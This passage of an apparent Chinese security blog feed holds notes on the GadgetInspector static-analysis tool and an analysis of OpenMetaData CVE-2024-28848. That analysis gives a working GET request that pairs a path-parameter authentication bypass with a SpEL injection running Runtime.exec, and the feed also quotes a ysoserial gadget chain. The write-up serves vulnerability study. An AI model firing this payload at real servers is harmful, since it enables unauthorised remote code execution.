methodsByClass.get(parent);<br>    <span class="hljs-keyword">if</span> (methods == <span class="hljs-literal">null</span>)<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">for</span> (MethodReference.Handle method : methods) &#123;<br>      <span class="hljs-keyword">if</span> (method.getName().equals(graphCall.getTargetMethod().getName()) &amp;&amp; method.getDesc().equals(graphCall.getTargetMethod().getDesc())) &#123;<br>        allImpls.add(method);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就修复了这个bug，在allImpls为空时，去methodByClass查找methods。如果还找不到，就continue。找到了，就加入allImpls。</p><h1 id="路径爆炸"><a href="#路径爆炸" class="headerlink" title="路径爆炸"></a>路径爆炸</h1><p>字面意思，结果出现了太多，太长的路径，重复的，循环调用的。</p><h2 id="分支过长"><a href="#分支过长" class="headerlink" title="分支过长"></a>分支过长</h2><p>加入了这个参数：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">// 增加超参数maxRepeatBranchesTimes，解决分支多用问题</span><br>              <span class="hljs-keyword">if</span> (exploredMethodsMap.containsKey(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>))&#123;<br>                <span class="hljs-keyword">if</span>(exploredMethodsMap.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>) &gt; ConfigHelper.maxRepeatBranchesTimes)&#123;<br>                  <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                exploredMethodsMap.put(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>, exploredMethodsMap.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>)+<span class="hljs-number">1</span>);<br>              &#125;<br></code></pre></td></tr></table></figure><p>默认20，超过就舍弃掉这个链。</p><h2 id="链聚合优化"><a href="#链聚合优化" class="headerlink" title="链聚合优化"></a>链聚合优化</h2><p>例如 <code>A -&gt; B -&gt; C</code> , <code>E -&gt; C -&gt; D</code> ，可以链聚合优化为<code>A-&gt;B-&gt;C-&gt;D</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//链聚合优化</span><br>Set&lt;GadgetChain&gt; tmpDiscoveredGadgets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><span class="hljs-keyword">for</span> (GadgetChain gadgetChain : methodsToExploreRepeat) &#123;<br>  <span class="hljs-type">GadgetChainLink</span> <span class="hljs-variable">lastLink</span> <span class="hljs-operator">=</span> gadgetChain.links.get(gadgetChain.links.size() - <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">for</span> (GadgetChain discoveredGadgetChain : discoveredGadgets) &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">exist</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (GadgetChainLink gadgetChainLink : discoveredGadgetChain.links) &#123;<br>      <span class="hljs-keyword">if</span> (exist) &#123;<br>        gadgetChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GadgetChain</span>(gadgetChain, gadgetChainLink);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (lastLink.equals(gadgetChainLink)) &#123;<br>        exist = <span class="hljs-literal">true</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (exist) &#123;<br>      tmpDiscoveredGadgets.add(gadgetChain);<br>    &#125;<br>  &#125;<br>&#125;<br>discoveredGadgets.addAll(tmpDiscoveredGadgets);<br></code></pre></td></tr></table></figure><p>算法流程：<br>还是刚刚的例子，比如链<code>A-&gt;B-&gt;C</code>， lastLink是C</p><p>遍历<code>E-&gt;C-&gt;D</code>所有节点，判断lastLink是否与其相等。相等exist赋值为true，合并为新链<code>A-&gt;B-&gt;C-&gt;D</code>，在循环结束后加入结果里。</p><h2 id="路径爆炸-1"><a href="#路径爆炸-1" class="headerlink" title="路径爆炸"></a>路径爆炸</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (ConfigHelper.similarLevel &gt; <span class="hljs-number">0</span>)&#123;<br>      TreeSet&lt;GadgetChain&gt; treeSimilar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;GadgetChain&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(GadgetChain o1, GadgetChain o2)</span> &#123;<br>          <span class="hljs-type">int</span> <span class="hljs-variable">compareResult</span> <span class="hljs-operator">=</span> o1.links.size() - o2.links.size();<br>          <span class="hljs-keyword">if</span> (compareResult == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> compareResult;<br><br>        &#125;<br>      &#125;);<br>      <span class="hljs-keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;<br>        <span class="hljs-keyword">if</span> (chain.links.size() &lt;= ConfigHelper.similarLevel)&#123;<br>          <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        treeSimilar.add(chain);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (!treeSimilar.isEmpty())&#123;<br>        Set&lt;ArrayList&lt;GadgetChainLink&gt;&gt; repeatSim = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (GadgetChain chain : treeSimilar)&#123;<br>          ArrayList&lt;GadgetChainLink&gt; temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(chain.links.subList(<span class="hljs-number">0</span>,ConfigHelper.similarLevel));<br>          temp.add(chain.links.get(chain.links.size()-<span class="hljs-number">1</span>));<br>          <span class="hljs-keyword">if</span>(repeatSim.contains(temp))&#123;<br>            discoveredGadgets.remove(chain);<br>          &#125;<br>          <span class="hljs-keyword">else</span> &#123;<br>            repeatSim.add(temp);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>但其实这个解决方法有点太简便了，它只解决了开头重复。比如说是：</p><p><code>A-&gt;B-&gt;C-&gt;D</code>,  <code>A-&gt;B-&gt;C-&gt;E</code>, 我们设置similarLevel 为3</p><p>那么遍历到第一条链子时把<code>A-&gt;B-&gt;C</code>加入repeatSim。遍历到第二条链子时，发现重复，就把第二条删了。</p><h1 id="Source-Sink优化"><a href="#Source-Sink优化" class="headerlink" title="Source&#x2F;Sink优化"></a>Source&#x2F;Sink优化</h1><p>sink就不说了，添加了各种类型漏洞的sink。我比较感兴趣的是web项目的source怎么定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!method.getName().contains(<span class="hljs-string">&quot;&lt;init&gt;&quot;</span>)<br>                        &amp;&amp; (method.getDesc().contains(<span class="hljs-string">&quot;Ljavax/servlet/http/HttpServletRequest&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Ljavax/servlet/ServletRequest&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Ljavax/xml/ws/handler/soap/SOAPMessageContext&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Ljavax/xml/ws/handler/MessageContext&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Ljavax/xml/rpc/handler/soap/SOAPMessageContext&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Lorg/apache/cxf/message/Message&quot;</span>)<br>                        || method.getDesc().contains(<span class="hljs-string">&quot;Lorg/aopalliance/intercept/MethodInvocation&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/RequestMapping&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Ljavax/ws/rs/Path&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/GetMapping&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/PostMapping&quot;</span>)<br>                        || methodValue.getParameterAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/RequestParam&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/PutMapping&quot;</span>)<br>                        || methodValue.getMethodAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/PatchMapping&quot;</span>)<br>                        || methodValue.getParameterAnnotationDesc().contains(<span class="hljs-string">&quot;Lorg/springframework/web/bind/annotation/DeleteMapping&quot;</span>)<br>                        || methodValue.getParameterAnnotationDesc().contains(<span class="hljs-string">&quot;Ljavax/ws/rs/QueryParam&quot;</span>)<br>                        || methodValue.getParameterAnnotationDesc().contains(<span class="hljs-string">&quot;Ljavax/ws/PathParam&quot;</span>)))<br>                &#123;<br>                    addDiscoveredSource(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Source</span>(method, <span class="hljs-number">0</span>));<br>                &#125;<br></code></pre></td></tr></table></figure><p>看java原生的source定义，和HttpServletRequest有关的，就作为source。</p><p>因为各种参数都放在这里面，如果调用它，很可能是用户从中获取的数据。但感觉会有误报。</p><p>然后另一类型是注解修饰的，比如Springboot，@RequestMapping注解修饰的方法，其参数是用户输入，所以这些方法也作为source。</p><p>框架众多，而各种source和sink也总结的比较全，就不再赘述了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>SAST</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GadgetInspector源码阅读学习</title>
    <link href="/2024/10/13/GadgetInspector%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/10/13/GadgetInspector%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>学习下SAST的内容，先从GadgetInspector开始。</p><p>涉及到大量asm和java字节操作码的知识，有点困难，日后还是要系统学下好。</p><p>文章参考：</p><p><a href="https://xz.aliyun.com/t/7058">https://xz.aliyun.com/t/7058</a></p><p><a href="https://tttang.com/archive/1683/">https://tttang.com/archive/1683/</a></p><p>网上很多文章感觉讲的很明白了，这里记录下核心逻辑的笔记。</p><h1 id="局部污点分析"><a href="#局部污点分析" class="headerlink" title="局部污点分析"></a>局部污点分析</h1><h2 id="逆拓扑排序"><a href="#逆拓扑排序" class="headerlink" title="逆拓扑排序"></a>逆拓扑排序</h2><p>首先要了解逆拓扑排序，例如一个有向无环图</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">A-&gt;B<br><br>A-&gt;C<br><br>B-&gt;D<br><br>C-&gt;D<br></code></pre></td></tr></table></figure><p>这里，节点 <code>D</code> 依赖于 <code>B</code> 和 <code>C</code>，而 <code>B</code> 和 <code>C</code> 都依赖于 <code>A</code></p><p>我想知道D是否依赖于A，那么就可以从逆拓扑排序的结果里找了。</p><p>比如这个排序结果就是<code>[D, B, C, A]</code> ，但注意的是，逆拓扑只能保证一个大概结果，比如我们无法判断B,C之间的关系。所以要判断这类关系还要看原始图结构</p><p>GadgetInspector的拓扑排序是基于DFS的，网上文章有很多，原理不写了，直接看他怎么实现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dfsTsort</span><span class="hljs-params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span><br><span class="hljs-params">                                    List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span><br><span class="hljs-params">                                    Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> &#123;<br><br><span class="hljs-comment">//环存在，直接return（不应该有环）</span><br>        <span class="hljs-keyword">if</span> (stack.contains(node)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// 访问过了，直接return</span><br>        <span class="hljs-keyword">if</span> (visitedNodes.contains(node)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <br>        Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);<br>        <span class="hljs-comment">//没有出边，代表到尽头了</span><br>        <span class="hljs-keyword">if</span> (outgoingRefs == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>  <span class="hljs-comment">//将节点加入栈中</span><br>        stack.add(node);<br>  <span class="hljs-comment">//递归调用所有子节点</span><br>        <span class="hljs-keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;<br>            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);<br>        &#125;<br>  <br>  <span class="hljs-comment">//最后栈是空的，全remove掉了</span><br>        stack.remove(node);<br>  <span class="hljs-comment">//该节点访问过了，加进visitedNodes</span><br>        visitedNodes.add(node);<br>  <span class="hljs-comment">//将该节点加入排序结果</span><br>        sortedMethods.add(node);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h2><p>在抵达一个方法的时候，先把this放在局部变量表第一位</p><p>然后来到TaintTrackingMethodVisitor#visitVarInsn</p><p><img src="/../GadgetInspector/QQ_1728813119732.png" alt="QQ_1728813119732"></p><p>ALOAD是引用类型的（对象），其他几个Int Float Double Long，反序列化中没啥用，直接给他忽略了。所以只有ALOAD分支才入操作数栈</p><p>然后来到PassthroughDiscovery#visitInsn</p><p><img src="/../GadgetInspector/QQ_1728813728064.png" alt="QQ_1728813728064"> </p><p>如图，会从操作数栈里获取污点</p><p><img src="/../GadgetInspector/QQ_1728814179298.png" alt="QQ_1728814179298"></p><p>为啥是拿栈顶的呢？因为JVM规定，返回值总是位于栈顶。</p><p>但是这里有点没太搞懂，他结果不是有可能有多个索引吗，这样的话只能获取一个？</p><p>最后会回到gadgetinspector.PassthroughDiscovery#calculatePassthroughDataflow</p><p><img src="/../GadgetInspector/QQ_1728813597496.png" alt="QQ_1728813597496"></p><p>缓存结果在passthroughDataflow</p><p>那么假如在某个函数里调用了另一个函数呢？此时就会来到：visitMethodInsn</p><p><img src="/../GadgetInspector/QQ_1728820234915.png" alt="QQ_1728820234915"></p><p>如图，重点在最后几行。passthroughDataflow就是之前的缓存结果，这也是为什么要逆拓扑排序。实际debug时，总是Object的构造函数最先被分析，因为Object是所有类的父类，其构造函数当然处于逆拓扑排序的开头部分。</p><p>这样，在某个函数调用另一个函数的时候，总可以在缓存里取到结果。</p><p>callgraph部分和这部分差不多，就不写了。</p><h1 id="SourceDiscovery"><a href="#SourceDiscovery" class="headerlink" title="SourceDiscovery"></a>SourceDiscovery</h1><p>这个类是决定反序列化入口的抽象类，可以先看其子类JacksonSourceDiscovery</p><p><img src="/../GadgetInspector/QQ_1728865018212.png" alt="QQ_1728865018212"></p><p>非常简单，构造函数，getter和setter可以作为入口。那么另一个呢？</p><p>SimpleSourceDiscovery</p><p><img src="/../GadgetInspector/QQ_1728865227590.png" alt="QQ_1728865227590"></p><p>第一次才知道java有这个方法，类似php的__destruct，实际环境中根本没人这么写！</p><p>然后看readObject，原生的反序列化入口。</p><p><img src="/../GadgetInspector/QQ_1728865398750.png" alt="QQ_1728865398750"></p><p>看网上的文章老说无法处理动态代理，看起来作者后来是加进去了。</p><p><img src="/../GadgetInspector/QQ_1728865464434.png" alt="QQ_1728865464434"></p><p>hashCode和equals也可以作为入口，可以把他们丢进hashMap触发。</p><p><img src="/../GadgetInspector/QQ_1728865625760.png" alt="QQ_1728865625760"></p><p>最后是一个groovy的代理</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less">https://github.com/frohoff/ysoserial/blob/master/<span class="hljs-attribute">src/main/java/ysoserial/payloads/Groovy1.java</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Gadget chain</span>:<br>ObjectInputStream.<span class="hljs-built_in">readObject</span>()<br>PriorityQueue.<span class="hljs-built_in">readObject</span>()<br>Comparator.<span class="hljs-built_in">compare</span>() (Proxy)<br>ConvertedClosure.<span class="hljs-built_in">invoke</span>()<br>MethodClosure.<span class="hljs-built_in">call</span>()<br>...<br>  Method.<span class="hljs-built_in">invoke</span>()<br>Runtime.<span class="hljs-built_in">exec</span>()<br></code></pre></td></tr></table></figure><h1 id="利用链挖掘"><a href="#利用链挖掘" class="headerlink" title="利用链挖掘"></a>利用链挖掘</h1><p>第二关键的部分，现在我们已经有了所有想要的数据，接下来就是利用链挖掘的算法了。</p><p><img src="/../GadgetInspector/QQ_1728871328383.png" alt="QQ_1728871328383"></p><p>首先加载了methodMap和inherianceMap，这些是在污点分析之前生成的。</p><p>methodMap里面是所有的方法，包含方法名，描述符等信息。</p><p>inheritanceMap结构是{某个类：{所有父类&#x2F;接口集合}}</p><p>因为java可以重写方法，运行时不确定是哪个类。例如</p><p>AbstactClass 和 ImplementationClassA, ImplementationClassB</p><p>假设声明AbstractClass clazz。这个clazz可以是上面三者任意一个，只有运行时才能确定。</p><p><img src="/../GadgetInspector/QQ_1728871827220.png" alt="QQ_1728871827220"></p><p>methodsByClass结构：{某类：{该类所有方法}}</p><p><img src="/../GadgetInspector/QQ_1728871881418.png" alt="QQ_1728871881418"></p><p>然后生成subClassMap，结构是：{某类：{所有子类&#x2F;实现}}。和inheritanceMap刚好相反</p><p><img src="/../GadgetInspector/QQ_1728872142324.png" alt="QQ_1728872142324"></p><p>遍历methodMap，首先判断method是否静态，静态方法不可被重写，是的话直接跳。</p><p>然后获得该方法对应的类 的所有子类的方法，一个一个检查是否重名并且描述符相同（重写方法）。如果有丢到overridingMethods。最后再丢到methodImplMap</p><p>所以methodImplMap的结构：{某方法：{它的所有重写方法}}</p><p><img src="/../GadgetInspector/QQ_1728872957325.png" alt="QQ_1728872957325"></p><p>回到GadgetChanDiscovery#discover， 这里对callGraph也做了整合，最终graphCallMap结构大致为：{某方法：{该方法里调用的所有方法}}</p><p><img src="/../GadgetInspector/QQ_1728873099231.png" alt="QQ_1728873099231"></p><p>这一步是source初始化，GadgetChainLink包含了sourceMethod和污点参数的信息。</p><p><img src="/../GadgetInspector/QQ_1728873588076.png" alt="QQ_1728873588076"></p><p>最后一步了。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GadgetChain chain <span class="hljs-operator">=</span> methodsToExplore.pop()<span class="hljs-comment">;</span><br>GadgetChainLink lastLink <span class="hljs-operator">=</span> chain.links.get(chain.links.size()-<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>先从methodsToExplore弹出一个chain，然后获取这个chain的最后一个Link节点。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Set</span>&lt;GraphCall&gt; methodCalls = graphCallMap.<span class="hljs-keyword">get</span>(lastLink.<span class="hljs-keyword">method</span>);<br></code></pre></td></tr></table></figure><p>从graphCallMap获取这个Link节点方法中，调用的所有其他方法。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后进入遍历，判断是否能被参数污染，不能就跳</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">Set<span class="hljs-variable">&lt;MethodReference.Handle&gt;</span> <span class="hljs-literal">all</span>Impls = implementationFinder.getImplementations(graphC<span class="hljs-literal">all</span>.getTargetMethod());<br></code></pre></td></tr></table></figure><p>获取被调用的方法的所有重写&#x2F;实现。再次遍历这个集合：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">GadgetChainLink <span class="hljs-keyword">new</span><span class="hljs-type">Link</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">GadgetChainLink</span>(methodImpl, graphCall.getTargetArgIndex());<br><span class="hljs-keyword">if</span> (exploredMethods.contains(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>)) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>&#125;<br><br>GadgetChain <span class="hljs-keyword">new</span><span class="hljs-type">Chain</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">GadgetChain</span>(chain, <span class="hljs-keyword">new</span><span class="hljs-type">Link</span>);<br></code></pre></td></tr></table></figure><p>生成新Link节点，if防止死循环。如果没问题就生成newChain，由之前的chain和newLink拼接而成。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;<br>    discoveredGadgets.add(<span class="hljs-keyword">new</span><span class="hljs-type">Chain</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    methodsToExplore.add(<span class="hljs-keyword">new</span><span class="hljs-type">Chain</span>);<br>    exploredMethods.add(<span class="hljs-keyword">new</span><span class="hljs-type">Link</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>判断是不是sink，是的话加入discoverdGadgets，不是的话，丢进methodsToExplore，以后循环遍历的时候继续往下找。并且还要计入exploredMethods防止重复。</p><p>随着methodsToExplore不断pop，exploredMethods不断增加，最后methodToExplore大小为0时，遍历结束，将结果写入txt文件里。</p><p>完。</p>]]></content>
    
    
    
    <tags>
      
      <tag>SAST</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenMetaData-CVE-2024-28848-权限绕过及RCE</title>
    <link href="/2024/08/19/OpenMetaData-CVE-2024-28848-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%8F%8ARCE/"/>
    <url>/2024/08/19/OpenMetaData-CVE-2024-28848-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%8F%8ARCE/</url>
    
    <content type="html"><![CDATA[<p>权限绕过是我的弱项，做的分析并不多。而且shiro那一堆权限绕过历史漏洞我还没看过，未来一段时间打算注重这个方面的学习。</p><p>这里写篇文章记录下。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://localhost:<span class="hljs-number">8585</span>/api/v1;v1<span class="hljs-meta">%2Fv1</span><span class="hljs-meta">%2Fusers</span><span class="hljs-meta">%2Flogin</span>/events/subscriptions/validation/condition/T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(new<span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.String(T(java.util.Base64).getDecoder().decode(<span class="hljs-meta">%22dG91Y2ggL3RtcC9zdWNjZXNz</span><span class="hljs-meta">%22</span>)))<br></code></pre></td></tr></table></figure><p>其实就一条get请求。base64是touch &#x2F;tmp&#x2F;success</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从payload来看，此处用了一个trick ，之前看星球里有讨论过叫Path Variables</p><p>;aaa&#x3D;bbb 如果出现在路由里，tomcat会把这段当成变量来处理。等同于?aaa&#x3D;bbb</p><p>而openMetaData用的是jetty + glassfish， 也有tomcat的这个特性，虽然我直接搜没搜到，可能藏在官方文档的深处，我不想翻了。</p><p>所以上述路由实际上是&#x2F;api&#x2F;v1&#x2F;events&#x2F;subscriptions&#x2F;validation&#x2F;condition&#x2F;{expression}</p><p>那么具体逻辑是如何的？</p><p>openMetaData的鉴权用的是jwt，鉴权逻辑在JwtFilter里。</p><p><img src="/../OpenMetaData/image-20240819170027139.png" alt="image-20240819170027139"></p><p>可以看到假如url里有EXCLUDED_ENDPOINTS就会直接放行，</p><p><img src="/../OpenMetaData/image-20240819170228669.png" alt="image-20240819170228669"></p><p>有很多直接放行的Endpoints，随便挑一个就能绕过。</p><p>但是此处还有一个要求，我们不能直接发送;v1&#x2F;system&#x2F;config ，必须把它url编码为</p><p>;v1%2Fsystem%2Fconfig这种才可以。所以服务器这边获取UrlInfo.getPath必须进行url解码才可以</p><p><img src="/../OpenMetaData/image-20240819170431755.png" alt="image-20240819170431755"></p><p>可以看到decode默认为true。那么权限绕过就OK了。</p><p>RCE部分就是常规的Spel注入了，我尝试了把base64换成直接输入命令但是好像路由会报错，所以就编个码吧。</p><p>总结：</p><p>Path Variables的trick</p><p>filter权限绕过</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>现代心理学之精神分析的学习与思考</title>
    <link href="/2024/08/05/%E7%8E%B0%E4%BB%A3%E5%BF%83%E7%90%86%E5%AD%A6%E4%B9%8B%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%9D%E8%80%83/"/>
    <url>/2024/08/05/%E7%8E%B0%E4%BB%A3%E5%BF%83%E7%90%86%E5%AD%A6%E4%B9%8B%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%9D%E8%80%83/</url>
    
